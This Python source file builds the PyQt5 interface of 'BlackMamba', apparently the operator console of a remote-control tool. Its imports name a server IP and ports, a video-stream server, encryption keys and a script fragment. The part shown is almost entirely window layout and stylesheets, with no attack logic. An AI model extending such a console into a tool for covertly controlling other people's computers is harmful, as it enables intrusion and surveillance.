####################################################################################
# BLACKMAMBA BY: LOSEYS (https://github.com/loseys)
#
# QT GUI INTERFACE BY: WANDERSON M.PIMENTA (https://github.com/Wanderson-Magalhaes)
# ORIGINAL QT GUI: https://github.com/Wanderson-Magalhaes/Simple_PySide_Base
####################################################################################

"""
>1284 - GUI configuration.
1284 - Start of server configuration and buttons configuration
"""
from cryptography.fernet import Fernet
from importlib import reload
from clientui.vstrm_server import *
from clientui.control import *
from clientui.ui_functions import UIFunctions
from clientui.app_modules import *
from bin.config import SERVER_IP, PORT, PORT_VIDEO

from PyQt5 import QtGui, QtCore, QtWidgets
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from PyQt5.QtWidgets import *

import sys
import threading
import files_rc
import time
import glob
import os
from zlib import decompress
from socket import *
from threading import Thread
import time
import threading
import re
from subprocess import call
from bin.fragment import body_script
from bin.set_key import server_key

# Python version
# Example: python3.9
python_v = 'python3'
refresh = False

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        if not MainWindow.objectName():
            MainWindow.setObjectName(u"MainWindow")
        MainWindow.resize(1000, 720)
        #MainWindow.resize(500, 500)

        MainWindow.setMinimumSize(QSize(1000, 720))
        #MainWindow.setMinimumSize(QSize(500, 500))
        palette = QPalette()
        brush = QBrush(QColor(255, 255, 255, 255))
        brush.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.WindowText, brush)
        brush1 = QBrush(QColor(0, 0, 0, 0))
        brush1.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Button, brush1)
        brush2 = QBrush(QColor(66, 73, 90, 255))
        brush2.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Light, brush2)
        brush3 = QBrush(QColor(55, 61, 75, 255))
        brush3.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Midlight, brush3)
        brush4 = QBrush(QColor(22, 24, 30, 255))
        brush4.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Dark, brush4)
        brush5 = QBrush(QColor(29, 32, 40, 255))
        brush5.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Mid, brush5)
        brush6 = QBrush(QColor(210, 210, 210, 255))
        brush6.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Text, brush6)
        palette.setBrush(QPalette.Active, QPalette.BrightText, brush)
        palette.setBrush(QPalette.Active, QPalette.ButtonText, brush)
        palette.setBrush(QPalette.Active, QPalette.Base, brush1)
        palette.setBrush(QPalette.Active, QPalette.Window, brush1)
        brush7 = QBrush(QColor(0, 0, 0, 255))
        brush7.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Shadow, brush7)
        brush8 = QBrush(QColor(85, 170, 255, 255))
        brush8.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.Highlight, brush8)
        palette.setBrush(QPalette.Active, QPalette.Link, brush8)
        brush9 = QBrush(QColor(255, 0, 127, 255))
        brush9.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.LinkVisited, brush9)
        palette.setBrush(QPalette.Active, QPalette.AlternateBase, brush4)
        brush10 = QBrush(QColor(44, 49, 60, 255))
        brush10.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Active, QPalette.ToolTipBase, brush10)
        palette.setBrush(QPalette.Active, QPalette.ToolTipText, brush6)
        brush11 = QBrush(QColor(210, 210, 210, 128))
        brush11.setStyle(Qt.NoBrush)
#if QT_VERSION >= QT_VERSION_CHECK(5, 12, 0)
        palette.setBrush(QPalette.Active, QPalette.PlaceholderText, brush11)
#endif
        palette.setBrush(QPalette.Inactive, QPalette.WindowText, brush)
        palette.setBrush(QPalette.Inactive, QPalette.Button, brush1)
        palette.setBrush(QPalette.Inactive, QPalette.Light, brush2)
        palette.setBrush(QPalette.Inactive, QPalette.Midlight, brush3)
        palette.setBrush(QPalette.Inactive, QPalette.Dark, brush4)
        palette.setBrush(QPalette.Inactive, QPalette.Mid, brush5)
        palette.setBrush(QPalette.Inactive, QPalette.Text, brush6)
        palette.setBrush(QPalette.Inactive, QPalette.BrightText, brush)
        palette.setBrush(QPalette.Inactive, QPalette.ButtonText, brush)
        palette.setBrush(QPalette.Inactive, QPalette.Base, brush1)
        palette.setBrush(QPalette.Inactive, QPalette.Window, brush1)
        palette.setBrush(QPalette.Inactive, QPalette.Shadow, brush7)
        palette.setBrush(QPalette.Inactive, QPalette.Highlight, brush8)
        palette.setBrush(QPalette.Inactive, QPalette.Link, brush8)
        palette.setBrush(QPalette.Inactive, QPalette.LinkVisited, brush9)
        palette.setBrush(QPalette.Inactive, QPalette.AlternateBase, brush4)
        palette.setBrush(QPalette.Inactive, QPalette.ToolTipBase, brush10)
        palette.setBrush(QPalette.Inactive, QPalette.ToolTipText, brush6)
        brush12 = QBrush(QColor(210, 210, 210, 128))
        brush12.setStyle(Qt.NoBrush)
#if QT_VERSION >= QT_VERSION_CHECK(5, 12, 0)
        palette.setBrush(QPalette.Inactive, QPalette.PlaceholderText, brush12)
#endif
        palette.setBrush(QPalette.Disabled, QPalette.WindowText, brush4)
        palette.setBrush(QPalette.Disabled, QPalette.Button, brush1)
        palette.setBrush(QPalette.Disabled, QPalette.Light, brush2)
        palette.setBrush(QPalette.Disabled, QPalette.Midlight, brush3)
        palette.setBrush(QPalette.Disabled, QPalette.Dark, brush4)
        palette.setBrush(QPalette.Disabled, QPalette.Mid, brush5)
        palette.setBrush(QPalette.Disabled, QPalette.Text, brush4)
        palette.setBrush(QPalette.Disabled, QPalette.BrightText, brush)
        palette.setBrush(QPalette.Disabled, QPalette.ButtonText, brush4)
        palette.setBrush(QPalette.Disabled, QPalette.Base, brush1)
        palette.setBrush(QPalette.Disabled, QPalette.Window, brush1)
        palette.setBrush(QPalette.Disabled, QPalette.Shadow, brush7)
        brush13 = QBrush(QColor(51, 153, 255, 255))
        brush13.setStyle(Qt.SolidPattern)
        palette.setBrush(QPalette.Disabled, QPalette.Highlight, brush13)
        palette.setBrush(QPalette.Disabled, QPalette.Link, brush8)
        palette.setBrush(QPalette.Disabled, QPalette.LinkVisited, brush9)
        palette.setBrush(QPalette.Disabled, QPalette.AlternateBase, brush10)
        palette.setBrush(QPalette.Disabled, QPalette.ToolTipBase, brush10)
        palette.setBrush(QPalette.Disabled, QPalette.ToolTipText, brush6)
        brush14 = QBrush(QColor(210, 210, 210, 128))
        brush14.setStyle(Qt.NoBrush)
#if QT_VERSION >= QT_VERSION_CHECK(5, 12, 0)
        palette.setBrush(QPalette.Disabled, QPalette.PlaceholderText, brush14)
#endif
        MainWindow.setPalette(palette)
        font = QFont()
        font.setFamily(u"Segoe UI")
        font.setPointSize(10)
        MainWindow.setFont(font)
        MainWindow.setStyleSheet(u"QMainWindow {background: transparent; }\n"
"QToolTip {\n"
"	color: #ffffff;\n"
"	background-color: rgba(27, 29, 35, 160);\n"
"	border: 1px solid rgb(40, 40, 40);\n"
"	border-radius: 2px;\n"
"}")
        self.centralwidget = QWidget(MainWindow)
        self.centralwidget.setObjectName(u"centralwidget")
        self.centralwidget.setStyleSheet(u"background: transparent;\n"
"color: rgb(210, 210, 210);")
        self.horizontalLayout = QHBoxLayout(self.centralwidget)
        self.horizontalLayout.setSpacing(0)
        self.horizontalLayout.setObjectName(u"horizontalLayout")
        self.horizontalLayout.setContentsMargins(10, 10, 10, 10)
        self.frame_main = QFrame(self.centralwidget)
        self.frame_main.setObjectName(u"frame_main")
        self.frame_main.setStyleSheet(u"/* LINE EDIT */\n"
"QLineEdit {\n"
"	background-color: rgb(27, 29, 35);\n"
"	border-radius: 5px;\n"
"	border: 2px solid rgb(27, 29, 35);\n"
"	padding-left: 10px;\n"
"}\n"
"QLineEdit:hover {\n"
"	border: 2px solid rgb(64, 71, 88);\n"
"}\n"
"QLineEdit:focus {\n"
"	border: 2px solid rgb(91, 101, 124);\n"
"}\n"
"\n"
"/* SCROLL BARS */\n"
"QScrollBar:horizontal {\n"
"    border: none;\n"
"    background: rgb(52, 59, 72);\n"
"    height: 14px;\n"
"    margin: 0px 21px 0 21px;\n"
"	border-radius: 0px;\n"
"}\n"
"QScrollBar::handle:horizontal {\n"
"    background: rgb(85, 170, 255);\n"
"    min-width: 25px;\n"
"	border-radius: 7px\n"
"}\n"
"QScrollBar::add-line:horizontal {\n"
"    border: none;\n"
"    background: rgb(55, 63, 77);\n"
"    width: 20px;\n"
"	border-top-right-radius: 7px;\n"
"    border-bottom-right-radius: 7px;\n"
"    subcontrol-position: right;\n"
"    subcontrol-origin: margin;\n"
"}\n"
"QScrollBar::sub-line:horizontal {\n"
"    border: none;\n"
"    background: rgb(55, 63, 77);\n"
"    width: 20px;\n"
""
                        "	border-top-left-radius: 7px;\n"
"    border-bottom-left-radius: 7px;\n"
"    subcontrol-position: left;\n"
"    subcontrol-origin: margin;\n"
"}\n"
"QScrollBar::up-arrow:horizontal, QScrollBar::down-arrow:horizontal\n"
"{\n"
"     background: none;\n"
"}\n"
"QScrollBar::add-page:horizontal, QScrollBar::sub-page:horizontal\n"
"{\n"
"     background: none;\n"
"}\n"
" QScrollBar:vertical {\n"
"	border: none;\n"
"    background: rgb(52, 59, 72);\n"
"    width: 14px;\n"
"    margin: 21px 0 21px 0;\n"
"	border-radius: 0px;\n"
" }\n"
" QScrollBar::handle:vertical {	\n"
"	background: rgb(85, 170, 255);\n"
"    min-height: 25px;\n"
"	border-radius: 7px\n"
" }\n"
" QScrollBar::add-line:vertical {\n"
"     border: none;\n"
"    background: rgb(55, 63, 77);\n"
"     height: 20px;\n"
"	border-bottom-left-radius: 7px;\n"
"    border-bottom-right-radius: 7px;\n"
"     subcontrol-position: bottom;\n"
"     subcontrol-origin: margin;\n"
" }\n"
" QScrollBar::sub-line:vertical {\n"
"	border: none;\n"
"    background: rgb(55, 63"
                        ", 77);\n"
"     height: 20px;\n"
"	border-top-left-radius: 7px;\n"
"    border-top-right-radius: 7px;\n"
"     subcontrol-position: top;\n"
"     subcontrol-origin: margin;\n"
" }\n"
" QScrollBar::up-arrow:vertical, QScrollBar::down-arrow:vertical {\n"
"     background: none;\n"
" }\n"
"\n"
" QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {\n"
"     background: none;\n"
" }\n"
"\n"
"/* CHECKBOX */\n"
"QCheckBox::indicator {\n"
"    border: 3px solid rgb(52, 59, 72);\n"
"	width: 15px;\n"
"	height: 15px;\n"
"	border-radius: 10px;\n"
"    background: rgb(44, 49, 60);\n"
"}\n"
"QCheckBox::indicator:hover {\n"
"    border: 3px solid rgb(58, 66, 81);\n"
"}\n"
"QCheckBox::indicator:checked {\n"
"    background: 3px solid rgb(52, 59, 72);\n"
"	border: 3px solid rgb(52, 59, 72);	\n"
"	background-image: url(:/16x16/icons/16x16/cil-check-alt.png);\n"
"}\n"
"\n"
"/* RADIO BUTTON */\n"
"QRadioButton::indicator {\n"
"    border: 3px solid rgb(52, 59, 72);\n"
"	width: 15px;\n"
"	height: 15px;\n"
"	border-radius"
                        ": 10px;\n"
"    background: rgb(44, 49, 60);\n"
"}\n"
"QRadioButton::indicator:hover {\n"
"    border: 3px solid rgb(58, 66, 81);\n"
"}\n"
"QRadioButton::indicator:checked {\n"
"    background: 3px solid rgb(94, 106, 130);\n"
"	border: 3px solid rgb(52, 59, 72);	\n"
"}\n"
"\n"
"/* COMBOBOX */\n"
"QComboBox{\n"
"	background-color: rgb(27, 29, 35);\n"
"	border-radius: 5px;\n"
"	border: 2px solid rgb(27, 29, 35);\n"
"	padding: 5px;\n"
"	padding-left: 10px;\n"
"}\n"
"QComboBox:hover{\n"
"	border: 2px solid rgb(64, 71, 88);\n"
"}\n"
"QComboBox::drop-down {\n"
"	subcontrol-origin: padding;\n"
"	subcontrol-position: top right;\n"
"	width: 25px; \n"
"	border-left-width: 3px;\n"
"	border-left-color: rgba(39, 44, 54, 150);\n"
"	border-left-style: solid;\n"
"	border-top-right-radius: 3px;\n"
"	border-bottom-right-radius: 3px;	\n"
"	background-image: url(:/16x16/icons/16x16/cil-arrow-bottom.png);\n"
"	background-position: center;\n"
"	background-repeat: no-reperat;\n"
" }\n"
"QComboBox QAbstractItemView {\n"
"	color: rgb("
                        "85, 170, 255);	\n"
"	background-color: rgb(27, 29, 35);\n"
"	padding: 10px;\n"
"	selection-background-color: rgb(39, 44, 54);\n"
"}\n"
"\n"
"/* SLIDERS */\n"
"QSlider::groove:horizontal {\n"
"    border-radius: 9px;\n"
"    height: 18px;\n"
"	margin: 0px;\n"
"	background-color: rgb(52, 59, 72);\n"
"}\n"
"QSlider::groove:horizontal:hover {\n"
"	background-color: rgb(55, 62, 76);\n"
"}\n"
"QSlider::handle:horizontal {\n"
"    background-color: rgb(85, 170, 255);\n"
"    border: none;\n"
"    height: 18px;\n"
"    width: 18px;\n"
"    margin: 0px;\n"
"	border-radius: 9px;\n"
"}\n"
"QSlider::handle:horizontal:hover {\n"
"    background-color: rgb(105, 180, 255);\n"
"}\n"
"QSlider::handle:horizontal:pressed {\n"
"    background-color: rgb(65, 130, 195);\n"
"}\n"
"\n"
"QSlider::groove:vertical {\n"
"    border-radius: 9px;\n"
"    width: 18px;\n"
"    margin: 0px;\n"
"	background-color: rgb(52, 59, 72);\n"
"}\n"
"QSlider::groove:vertical:hover {\n"
"	background-color: rgb(55, 62, 76);\n"
"}\n"
"QSlider::handle:verti"
                        "cal {\n"
"    background-color: rgb(85, 170, 255);\n"
"	border: none;\n"
"    height: 18px;\n"
"    width: 18px;\n"
"    margin: 0px;\n"
"	border-radius: 9px;\n"
"}\n"
"QSlider::handle:vertical:hover {\n"
"    background-color: rgb(105, 180, 255);\n"
"}\n"
"QSlider::handle:vertical:pressed {\n"
"    background-color: rgb(65, 130, 195);\n"
"}\n"
"\n"
"")
        self.frame_main.setFrameShape(QFrame.NoFrame)
        self.frame_main.setFrameShadow(QFrame.Raised)
        self.verticalLayout = QVBoxLayout(self.frame_main)
        self.verticalLayout.setSpacing(0)
        self.verticalLayout.setObjectName(u"verticalLayout")
        self.verticalLayout.setContentsMargins(0, 0, 0, 0)
        self.frame_top = QFrame(self.frame_main)
        self.frame_top.setObjectName(u"frame_top")
        self.frame_top.setMinimumSize(QSize(0, 65))
        self.frame_top.setMaximumSize(QSize(16777215, 65))
        self.frame_top.setStyleSheet(u"background-color: transparent;")
        self.frame_top.setFrameShape(QFrame.NoFrame)
        self.frame_top.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_3 = QHBoxLayout(self.frame_top)
        self.horizontalLayout_3.setSpacing(0)
        self.horizontalLayout_3.setObjectName(u"horizontalLayout_3")
        self.horizontalLayout_3.setContentsMargins(0, 0, 0, 0)
        self.frame_toggle = QFrame(self.frame_top)
        self.frame_toggle.setObjectName(u"frame_toggle")
        self.frame_toggle.setMaximumSize(QSize(70, 16777215))
        self.frame_toggle.setStyleSheet(u"background-color: rgb(27, 29, 35);")
        self.frame_toggle.setFrameShape(QFrame.NoFrame)
        self.frame_toggle.setFrameShadow(QFrame.Raised)
        self.verticalLayout_3 = QVBoxLayout(self.frame_toggle)
        self.verticalLayout_3.setSpacing(0)
        self.verticalLayout_3.setObjectName(u"verticalLayout_3")
        self.verticalLayout_3.setContentsMargins(0, 0, 0, 0)
        self.btn_toggle_menu = QPushButton(self.frame_toggle)
        self.btn_toggle_menu.setObjectName(u"btn_toggle_menu")
        sizePolicy = QSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.btn_toggle_menu.sizePolicy().hasHeightForWidth())
        self.btn_toggle_menu.setSizePolicy(sizePolicy)
        self.btn_toggle_menu.setStyleSheet(u"QPushButton {\n"
"	background-image: url(:/24x24/icons/24x24/cil-menu.png);\n"
"	background-position: center;\n"
"	background-repeat: no-reperat;\n"
"	border: none;\n"
"	background-color: rgb(27, 29, 35);\n"
"}\n"
"QPushButton:hover {\n"
"	background-color: rgb(33, 37, 43);\n"
"}\n"
"QPushButton:pressed {	\n"
"	background-color: rgb(85, 170, 255);\n"
"}")

        self.verticalLayout_3.addWidget(self.btn_toggle_menu)


        self.horizontalLayout_3.addWidget(self.frame_toggle)

        self.frame_top_right = QFrame(self.frame_top)
        self.frame_top_right.setObjectName(u"frame_top_right")
        self.frame_top_right.setStyleSheet(u"background: transparent;")
        self.frame_top_right.setFrameShape(QFrame.NoFrame)
        self.frame_top_right.setFrameShadow(QFrame.Raised)
        self.verticalLayout_2 = QVBoxLayout(self.frame_top_right)
        self.verticalLayout_2.setSpacing(0)
        self.verticalLayout_2.setObjectName(u"verticalLayout_2")
        self.verticalLayout_2.setContentsMargins(0, 0, 0, 0)
        self.frame_top_btns = QFrame(self.frame_top_right)
        self.frame_top_btns.setObjectName(u"frame_top_btns")
        self.frame_top_btns.setMaximumSize(QSize(16777215, 42))
        self.frame_top_btns.setStyleSheet(u"background-color: rgba(27, 29, 35, 200)")
        self.frame_top_btns.setFrameShape(QFrame.NoFrame)
        self.frame_top_btns.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_4 = QHBoxLayout(self.frame_top_btns)
        self.horizontalLayout_4.setSpacing(0)
        self.horizontalLayout_4.setObjectName(u"horizontalLayout_4")
        self.horizontalLayout_4.setContentsMargins(0, 0, 0, 0)
        self.frame_label_top_btns = QFrame(self.frame_top_btns)
        self.frame_label_top_btns.setObjectName(u"frame_label_top_btns")
        sizePolicy1 = QSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        sizePolicy1.setHorizontalStretch(0)
        sizePolicy1.setVerticalStretch(0)
        sizePolicy1.setHeightForWidth(self.frame_label_top_btns.sizePolicy().hasHeightForWidth())
        self.frame_label_top_btns.setSizePolicy(sizePolicy1)
        self.frame_label_top_btns.setFrameShape(QFrame.NoFrame)
        self.frame_label_top_btns.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_10 = QHBoxLayout(self.frame_label_top_btns)
        self.horizontalLayout_10.setSpacing(0)
        self.horizontalLayout_10.setObjectName(u"horizontalLayout_10")
        self.horizontalLayout_10.setContentsMargins(5, 0, 10, 0)
        #self.frame_icon_top_bar = QFrame(self.frame_label_top_btns)
        #self.frame_icon_top_bar.setObjectName(u"frame_icon_top_bar")
        #self.frame_icon_top_bar.setMaximumSize(QSize(30, 30))
        #self.frame_icon_top_bar.setStyleSheet(u"background: transparent;\n"
#"background-image: url(:/16x16/icons/16x16/cil-terminal.png);\n"
#"background-position: center;\n"
#"background-repeat: no-repeat;\n"
#"")
        #self.frame_icon_top_bar.setFrameShape(QFrame.StyledPanel)
        #self.frame_icon_top_bar.setFrameShadow(QFrame.Raised)

        #self.horizontalLayout_10.addWidget(self.frame_icon_top_bar)

        self.label_title_bar_top = QLabel(self.frame_label_top_btns)
        self.label_title_bar_top.setObjectName(u"label_title_bar_top")
        font1 = QFont()
        font1.setFamily(u"Segoe UI")
        font1.setPointSize(10)
        font1.setBold(True)
        font1.setWeight(75)
        self.label_title_bar_top.setFont(font1)
        self.label_title_bar_top.setStyleSheet(u"background: transparent;\n"
"")

        self.horizontalLayout_10.addWidget(self.label_title_bar_top)


        self.horizontalLayout_4.addWidget(self.frame_label_top_btns)

        self.frame_btns_right = QFrame(self.frame_top_btns)
        self.frame_btns_right.setObjectName(u"frame_btns_right")
        sizePolicy1.setHeightForWidth(self.frame_btns_right.sizePolicy().hasHeightForWidth())
        self.frame_btns_right.setSizePolicy(sizePolicy1)
        self.frame_btns_right.setMaximumSize(QSize(120, 16777215))
        self.frame_btns_right.setFrameShape(QFrame.NoFrame)
        self.frame_btns_right.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_5 = QHBoxLayout(self.frame_btns_right)
        self.horizontalLayout_5.setSpacing(0)
        self.horizontalLayout_5.setObjectName(u"horizontalLayout_5")
        self.horizontalLayout_5.setContentsMargins(0, 0, 0, 0)
        self.btn_minimize = QPushButton(self.frame_btns_right)
        self.btn_minimize.setObjectName(u"btn_minimize")
        sizePolicy2 = QSizePolicy(QSizePolicy.Minimum, QSizePolicy.Expanding)
        sizePolicy2.setHorizontalStretch(0)
        sizePolicy2.setVerticalStretch(0)
        sizePolicy2.setHeightForWidth(self.btn_minimize.sizePolicy().hasHeightForWidth())
        self.btn_minimize.setSizePolicy(sizePolicy2)
        self.btn_minimize.setMinimumSize(QSize(40, 0))
        self.btn_minimize.setMaximumSize(QSize(40, 16777215))
        self.btn_minimize.setStyleSheet(u"QPushButton {	\n"
"	border: none;\n"
"	background-color: transparent;\n"
"}\n"
"QPushButton:hover {\n"
"	background-color: rgb(52, 59, 72);\n"
"}\n"
"QPushButton:pressed {	\n"
"	background-color: rgb(85, 170, 255);\n"
"}")
        icon = QIcon()
        icon.addFile(u":/16x16/icons/16x16/cil-window-minimize.png", QSize(), QIcon.Normal, QIcon.Off)
        self.btn_minimize.setIcon(icon)

        self.horizontalLayout_5.addWidget(self.btn_minimize)

        self.btn_maximize_restore = QPushButton(self.frame_btns_right)
        self.btn_maximize_restore.setObjectName(u"btn_maximize_restore")
        sizePolicy2.setHeightForWidth(self.btn_maximize_restore.sizePolicy().hasHeightForWidth())
        self.btn_maximize_restore.setSizePolicy(sizePolicy2)
        self.btn_maximize_restore.setMinimumSize(QSize(40, 0))
        self.btn_maximize_restore.setMaximumSize(QSize(40, 16777215))
        self.btn_maximize_restore.setStyleSheet(u"QPushButton {	\n"
"	border: none;\n"
"	background-color: transparent;\n"
"}\n"
"QPushButton:hover {\n"
"	background-color: rgb(52, 59, 72);\n"
"}\n"
"QPushButton:pressed {	\n"
"	background-color: rgb(85, 170, 255);\n"
"}")
        icon1 = QIcon()
        icon1.addFile(u":/16x16/icons/16x16/cil-window-maximize.png", QSize(), QIcon.Normal, QIcon.Off)
        self.btn_maximize_restore.setIcon(icon1)

        self.horizontalLayout_5.addWidget(self.btn_maximize_restore)

        self.btn_close = QPushButton(self.frame_btns_right)
        self.btn_close.setObjectName(u"btn_close")
        sizePolicy2.setHeightForWidth(self.btn_close.sizePolicy().hasHeightForWidth())
        self.btn_close.setSizePolicy(sizePolicy2)
        self.btn_close.setMinimumSize(QSize(40, 0))
        self.btn_close.setMaximumSize(QSize(40, 16777215))
        self.btn_close.setStyleSheet(u"QPushButton {	\n"
"	border: none;\n"
"	background-color: transparent;\n"
"}\n"
"QPushButton:hover {\n"
"	background-color: rgb(52, 59, 72);\n"
"}\n"
"QPushButton:pressed {	\n"
"	background-color: rgb(85, 170, 255);\n"
"}")
        icon2 = QIcon()
        icon2.addFile(u":/16x16/icons/16x16/cil-x.png", QSize(), QIcon.Normal, QIcon.Off)
        self.btn_close.setIcon(icon2)

        self.horizontalLayout_5.addWidget(self.btn_close)


        self.horizontalLayout_4.addWidget(self.frame_btns_right, 0, Qt.AlignRight)


        self.verticalLayout_2.addWidget(self.frame_top_btns)

        self.frame_top_info = QFrame(self.frame_top_right)
        self.frame_top_info.setObjectName(u"frame_top_info")
        self.frame_top_info.setMaximumSize(QSize(16777215, 65))
        self.frame_top_info.setStyleSheet(u"background-color: rgb(39, 44, 54);")
        self.frame_top_info.setFrameShape(QFrame.NoFrame)
        self.frame_top_info.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_8 = QHBoxLayout(self.frame_top_info)
        self.horizontalLayout_8.setSpacing(0)
        self.horizontalLayout_8.setObjectName(u"horizontalLayout_8")
        self.horizontalLayout_8.setContentsMargins(10, 0, 10, 0)
        self.label_top_info_1 = QLabel(self.frame_top_info)
        self.label_top_info_1.setObjectName(u"label_top_info_1")
        self.label_top_info_1.setMaximumSize(QSize(16777215, 15))
        font2 = QFont()
        font2.setFamily(u"Segoe UI")
        self.label_top_info_1.setFont(font2)
        self.label_top_info_1.setStyleSheet(u"color: rgb(98, 103, 111); ")

        self.horizontalLayout_8.addWidget(self.label_top_info_1)

        self.label_top_info_2 = QLabel(self.frame_top_info)
        self.label_top_info_2.setObjectName(u"label_top_info_2")
        self.label_top_info_2.setMinimumSize(QSize(0, 0))
        self.label_top_info_2.setMaximumSize(QSize(250, 20))
        font3 = QFont()
        font3.setFamily(u"Segoe UI")
        font3.setBold(True)
        font3.setWeight(75)
        self.label_top_info_2.setFont(font3)
        self.label_top_info_2.setStyleSheet(u"color: rgb(98, 103, 111);")
        self.label_top_info_2.setAlignment(Qt.AlignRight|Qt.AlignTrailing|Qt.AlignVCenter)

        self.horizontalLayout_8.addWidget(self.label_top_info_2)


        self.verticalLayout_2.addWidget(self.frame_top_info)


        self.horizontalLayout_3.addWidget(self.frame_top_right)


        self.verticalLayout.addWidget(self.frame_top)

        self.frame_center = QFrame(self.frame_main)
        self.frame_center.setObjectName(u"frame_center")
        sizePolicy.setHeightForWidth(self.frame_center.sizePolicy().hasHeightForWidth())
        self.frame_center.setSizePolicy(sizePolicy)
        self.frame_center.setStyleSheet(u"background-color: rgb(40, 44, 52);")
        self.frame_center.setFrameShape(QFrame.NoFrame)
        self.frame_center.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_2 = QHBoxLayout(self.frame_center)
        self.horizontalLayout_2.setSpacing(0)
        self.horizontalLayout_2.setObjectName(u"horizontalLayout_2")
        self.horizontalLayout_2.setContentsMargins(0, 0, 0, 0)
        self.frame_left_menu = QFrame(self.frame_center)
        self.frame_left_menu.setObjectName(u"frame_left_menu")
        sizePolicy3 = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred)
        sizePolicy3.setHorizontalStretch(0)
        sizePolicy3.setVerticalStretch(0)
        sizePolicy3.setHeightForWidth(self.frame_left_menu.sizePolicy().hasHeightForWidth())
        self.frame_left_menu.setSizePolicy(sizePolicy3)
        self.frame_left_menu.setMinimumSize(QSize(70, 0))
        self.frame_left_menu.setMaximumSize(QSize(70, 16777215))
        self.frame_left_menu.setLayoutDirection(Qt.LeftToRight)
        self.frame_left_menu.setStyleSheet(u"background-color: rgb(27, 29, 35);")
        self.frame_left_menu.setFrameShape(QFrame.NoFrame)
        self.frame_left_menu.setFrameShadow(QFrame.Raised)
        self.verticalLayout_5 = QVBoxLayout(self.frame_left_menu)
        self.verticalLayout_5.setSpacing(1)
        self.verticalLayout_5.setObjectName(u"verticalLayout_5")
        self.verticalLayout_5.setContentsMargins(0, 10, 0, 15)
        self.frame_menus = QFrame(self.frame_left_menu)
        self.frame_menus.setObjectName(u"frame_menus")
        self.frame_menus.setFrameShape(QFrame.NoFrame)
        self.frame_menus.setFrameShadow(QFrame.Raised)
        self.layout_menus = QVBoxLayout(self.frame_menus)
        self.layout_menus.setSpacing(0)
        self.layout_menus.setObjectName(u"layout_menus")
        self.layout_menus.setContentsMargins(0, 0, 0, 0)

        self.verticalLayout_5.addWidget(self.frame_menus, 0, Qt.AlignTop)
        #####################################################################################

        self.btn_new_user2 = QPushButton(self.frame_left_menu)
        self.btn_new_user2.setObjectName(u"btn_new_user2")
        sizePolicy4 = QSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        sizePolicy4.setHorizontalStretch(0)
        sizePolicy4.setVerticalStretch(0)
        sizePolicy4.setHeightForWidth(self.btn_new_user2.sizePolicy().hasHeightForWidth())
        self.btn_new_user2.setSizePolicy(sizePolicy4)
        self.btn_new_user2.setMinimumSize(QSize(0, 60))
        self.btn_new_user2.setFont(font2)
        self.btn_new_user2.setLayoutDirection(Qt.LeftToRight)
        self.btn_new_user2.setStyleSheet(u"QPushButton {	\n"
                                        "	background-image: url(:/16x16/icons/16x16/cil-reload.png);\n"
                                        "	background-position: left center;\n"
                                        "    background-repeat: no-repeat;\n"
                                        "	border: none;\n"
                                        "	border-left: 28px solid rgb(27, 29, 35);\n"
                                        "	background-color: rgb(27, 29, 35);\n"
                                        "	text-align: left;\n"
                                        "	padding-left: 45px;\n"
                                        "}\n"
                                        "QPushButton:hover {\n"
                                        "	background-color: rgb(33, 37, 43);\n"
                                        "	border-left: 28px solid rgb(33, 37, 43);\n"
                                        "}\n"
                                        "QPushButton:pressed {	\n"
                                        "	background-color: rgb(85, 170, 255);\n"
                                        "	border-left: 28px solid rgb(85, 170, 255);\n"
                                        "}")

        self.verticalLayout_5.addWidget(self.btn_new_user2)

        #####################################################################################

        self.btn_new_user = QPushButton(self.frame_left_menu)
        self.btn_new_user.setObjectName(u"btn_new_user")
        sizePolicy4 = QSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        sizePolicy4.setHorizontalStretch(0)
        sizePolicy4.setVerticalStretch(0)
        sizePolicy4.setHeightForWidth(self.btn_new_user.sizePolicy().hasHeightForWidth())
        self.btn_new_user.setSizePolicy(sizePolicy4)
        self.btn_new_user.setMinimumSize(QSize(0, 60))
        self.btn_new_user.setFont(font2)
        self.btn_new_user.setLayoutDirection(Qt.LeftToRight)
        self.btn_new_user.setStyleSheet(u"QPushButton {	\n"
"	background-image: url(:/16x16/icons/16x16/cil-screen-desktop.png);\n"
"	background-position: left center;\n"
"    background-repeat: no-repeat;\n"
"	border: none;\n"
"	border-left: 28px solid rgb(27, 29, 35);\n"
"	background-color: rgb(27, 29, 35);\n"
"	text-align: left;\n"
"	padding-left: 45px;\n"
"}\n"
"QPushButton:hover {\n"
"	background-color: rgb(33, 37, 43);\n"
"	border-left: 28px solid rgb(33, 37, 43);\n"
"}\n"
"QPushButton:pressed {	\n"
"	background-color: rgb(85, 170, 255);\n"
"	border-left: 28px solid rgb(85, 170, 255);\n"
"}")

        self.verticalLayout_5.addWidget(self.btn_new_user)

        self.btn_save_2 = QPushButton(self.frame_left_menu)
        self.btn_save_2.setObjectName(u"btn_save_2")
